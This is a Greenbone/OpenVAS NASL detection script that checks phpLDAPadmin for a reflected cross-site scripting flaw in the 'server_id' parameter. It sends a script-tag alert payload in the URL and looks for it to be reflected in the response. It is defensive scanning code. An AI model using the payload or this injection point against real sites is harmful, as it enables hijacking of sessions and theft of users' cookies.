# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103406");
  script_version("2023-10-27T05:05:28+0000");
  script_tag(name:"cvss_base", value:"2.6");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:N/I:P/A:N");

  script_name("phpLDAPadmin 'server_id' Parameter Cross Site Scripting Vulnerabilities");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51794");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/521450");

  script_tag(name:"last_modification", value:"2023-10-27 05:05:28 +0000 (Fri, 27 Oct 2023)");
  script_tag(name:"creation_date", value:"2012-02-02 11:00:37 +0100 (Thu, 02 Feb 2012)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_dependencies("phpldapadmin_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("phpldapadmin/installed");

  script_tag(name:"summary", value:"phpLDAPadmin is prone to cross-site scripting vulnerabilities because
  it fails to properly sanitize user-supplied input.");

  script_tag(name:"impact", value:"An attacker may leverage these issues to execute arbitrary script code
  in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker
  to steal cookie-based authentication credentials and launch other attacks.");

  script_tag(name:"affected", value:"phpLDAPadmin 1.2.0.5-2 is affected, other versions may also be
  vulnerable.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to
  upgrade to a newer release, disable respective features, remove the product or replace the product by
  another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

CPE = "cpe:/a:phpldapadmin_project:phpldapadmin";

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = string(dir, "/index.php?server_id=<script>alert('xss-test')</script>&redirect=false");

if(http_vuln_check(port:port, url:url, pattern:"<script>alert\('xss-test'\)</script>", check_header:TRUE)) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(0);
